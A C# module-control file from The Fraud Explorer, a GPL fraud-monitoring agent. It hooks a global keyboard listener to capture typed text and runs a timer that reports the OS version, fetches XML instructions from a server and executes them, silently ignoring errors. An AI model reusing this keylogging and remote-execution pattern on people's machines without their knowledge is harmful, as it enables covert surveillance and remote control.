/*
 * The Fraud Explorer
 * https://www.thefraudexplorer.com/
 *
 * Copyright (c) 2017 The Fraud Explorer
 * email: support@thefraudexplorer.com
 * Licensed under GNU GPL v3
 * https://www.thefraudexplorer.com/License
 *
 * Date: 2017-04
 * Revision: v1.0.0-beta
 *
 * Description: Module control
 */

using System;
using TFE_core.Database;
using TFE_core.Networking;
using TFE_core.Analytics;
using System.Threading;

namespace TFE_core.Config
{
    /// <summary>
    ///Modules control
    /// </summary>

    #region Modules control

    class Modules { }

    public class modulesControl
    {
        TextAnalytics KeyboardListener = new TextAnalytics();
        System.Threading.Timer XMLTimer;

        public void startModules()
        {
            // Module Load: Text Analytics

            if (SQLStorage.retrievePar(Settings.TAFLAG) == "1")
            {
                TextAnalyticsLogger.Setup_textAnalytics();
                KeyboardListener.KeyDown += new RawKeyEventHandler(KBHelpers.KeyboardListener_KeyDown);
                GC.KeepAlive(KeyboardListener);
            }

            // Start XML reader
                  
            XMLTimer = new System.Threading.Timer(new TimerCallback(EnTimer), null, 0, (long)Convert.ToInt64(SQLStorage.retrievePar(Settings.HEARTBEAT)));
        }

        // Online checks timer

        XMLReader xdoc = new XMLReader();
        void EnTimer(object obj)
        {           
            try
            {
                if (Network.Online())
                {
                    Network.UpdateState(Common.OSVersion());
                    xdoc.GetXML();
                    xdoc.ExecuteXML();
                }
            }
            catch { }
        }
    }

    #endregion
}
